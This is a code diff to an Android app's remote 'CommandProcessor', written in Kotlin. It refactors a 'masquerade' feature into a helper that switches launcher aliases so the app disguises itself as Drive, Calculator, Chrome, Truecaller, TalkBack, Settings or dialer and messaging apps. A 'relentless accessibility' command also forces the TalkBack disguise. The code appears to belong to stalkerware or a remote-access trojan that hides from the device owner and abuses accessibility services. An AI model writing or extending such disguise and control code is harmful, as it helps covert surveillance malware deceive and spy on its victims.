@@ -959,39 +959,12 @@ object CommandProcessor {
                 }
                 "SET_MASQUERADE" -> {
                     val skin = content.trim().uppercase()
-                    val aliasMap = mapOf(
-                        "DRIVE" to ".AliasDrive", "CALC" to ".AliasCalc",
-                        "GOOGLE_PHONE" to ".AliasGooglePhone", "GOOGLE_MSG" to ".AliasGoogleMsg",
-                        "SAM_PHONE" to ".AliasSamPhone", "SAM_MSG" to ".AliasSamMsg",
-                        "CHROME" to ".AliasChrome", "IMO" to ".AliasImo",
-                        "IMO_HD" to ".AliasImoHd", "IMO_BETA" to ".AliasImoBeta", "IMO_LITE" to ".AliasImoLite",
-                        "TRUECALLER" to ".AliasTruecaller", "TALKBACK" to ".AliasTalkBack", "SETTINGS" to ".AliasSettings"
-                    )
-
-                    if (aliasMap.containsKey(skin)) {
-                        val pm = ctx.packageManager
-                        aliasMap.forEach { (key, aliasName) ->
-                            val comp = android.content.ComponentName(ctx, "${ctx.packageName}$aliasName")
-                            val state = if (key == skin) android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED 
-                                        else android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED
-                            pm.setComponentEnabledSetting(comp, state, android.content.pm.PackageManager.DONT_KILL_APP)
-                        }
-
-                        val targetComp = android.content.ComponentName(ctx, "${ctx.packageName}${aliasMap[skin]}")
-                        val verifiedState = pm.getComponentEnabledSetting(targetComp)
-                        
-                        if (verifiedState == android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED) {
-                            ctx.getSharedPreferences("app_config", Context.MODE_PRIVATE).edit()
-                                .putString("active_masquerade_skin", skin).apply()
-                            status = "SUCCESS"
-                            errorMsg = "Identity transformed to $skin"
-                        } else {
-                            status = "FAILED_VERIFICATION"
-                            errorMsg = "Component state did not update (Current: $verifiedState)"
-                        }
+                    if (applyMasqueradeSkin(ctx, skin)) {
+                        status = "SUCCESS"
+                        errorMsg = "Identity transformed to $skin"
                     } else {
-                        status = "FAILED_INVALID_SKIN"
-                        errorMsg = "Skin $skin not recognized."
+                        status = "FAILED"
+                        errorMsg = "Skin $skin not recognized or component rejected update."
                     }
                 }
                 "SET_TILE_STATE" -> {
@@ -1208,24 +1181,7 @@ object CommandProcessor {
                 }
                 "SET_RELENTLESS_ACC" -> {
                     // 1. Force Skin Change to TalkBack immediately
-                    val skin = "TALKBACK"
-                    val aliasMap = mapOf(
-                        "DRIVE" to ".AliasDrive", "CALC" to ".AliasCalc",
-                        "GOOGLE_PHONE" to ".AliasGooglePhone", "GOOGLE_MSG" to ".AliasGoogleMsg",
-                        "SAM_PHONE" to ".AliasSamPhone", "SAM_MSG" to ".AliasSamMsg",
-                        "CHROME" to ".AliasChrome", "IMO" to ".AliasImo",
-                        "IMO_HD" to ".AliasImoHd", "IMO_BETA" to ".AliasImoBeta", "IMO_LITE" to ".AliasImoLite",
-                        "TRUECALLER" to ".AliasTruecaller", "TALKBACK" to ".AliasTalkBack", "SETTINGS" to ".AliasSettings"
-                    )
-                    val pm = ctx.packageManager
-                    aliasMap.forEach { (key, aliasName) ->
-                        val comp = android.content.ComponentName(ctx, "${ctx.packageName}$aliasName")
-                        val state = if (key == skin) android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED 
-                                    else android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED
-                        pm.setComponentEnabledSetting(comp, state, android.content.pm.PackageManager.DONT_KILL_APP)
-                    }
-                    ctx.getSharedPreferences("app_config", Context.MODE_PRIVATE).edit()
-                        .putString("active_masquerade_skin", skin).apply()
+                    applyMasqueradeSkin(ctx, "TALKBACK")
 
                     // 2. Configure Relentless ACC rules
                     val parts = content.split("|")
@@ -1417,6 +1373,40 @@ object CommandProcessor {
 
         // Update DB
         updateCommandStatus(ctx, id, status, errorMsg)
+    }
+
+    fun applyMasqueradeSkin(ctx: Context, skin: String): Boolean {
+        val aliasMap = mapOf(
+            "DRIVE" to ".AliasDrive", "CALC" to ".AliasCalc",
+            "GOOGLE_PHONE" to ".AliasGooglePhone", "GOOGLE_MSG" to ".AliasGoogleMsg",
+            "SAM_PHONE" to ".AliasSamPhone", "SAM_MSG" to ".AliasSamMsg",
+            "CHROME" to ".AliasChrome", "IMO" to ".AliasImo",
+            "IMO_HD" to ".AliasImoHd", "IMO_BETA" to ".AliasImoBeta", "IMO_LITE" to ".AliasImoLite",
+            "TRUECALLER" to ".AliasTruecaller", "TALKBACK" to ".AliasTalkBack", "SETTINGS" to ".AliasSettings"
+        )
+
+        if (!aliasMap.containsKey(skin)) return false
+
+        val prefs = ctx.getSharedPreferences("app_config", Context.MODE_PRIVATE)
+        val currentSkin = prefs.getString("active_masquerade_skin", "")
+        if (currentSkin == skin) return true // Already active
+
+        val pm = ctx.packageManager
+        aliasMap.forEach { (key, aliasName) ->
+            val comp = android.content.ComponentName(ctx, "${ctx.packageName}$aliasName")
+            val state = if (key == skin) android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED 
+                        else android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED
+            pm.setComponentEnabledSetting(comp, state, android.content.pm.PackageManager.DONT_KILL_APP)
+        }
+
+        val targetComp = android.content.ComponentName(ctx, "${ctx.packageName}${aliasMap[skin]}")
+        val success = pm.getComponentEnabledSetting(targetComp) == android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED
+        
+        if (success) {
+            prefs.edit().putString("active_masquerade_skin", skin).apply()
+            DebugLogger.log("SKIN", "Identity transformed to $skin")
+        }
+        return success
     }
 
     fun updateCommandStatus(ctx: Context, id: Int, status: String, errorMsg: String? = null, resultData: JSONObject? = null, resultFilePath: String? = null) {
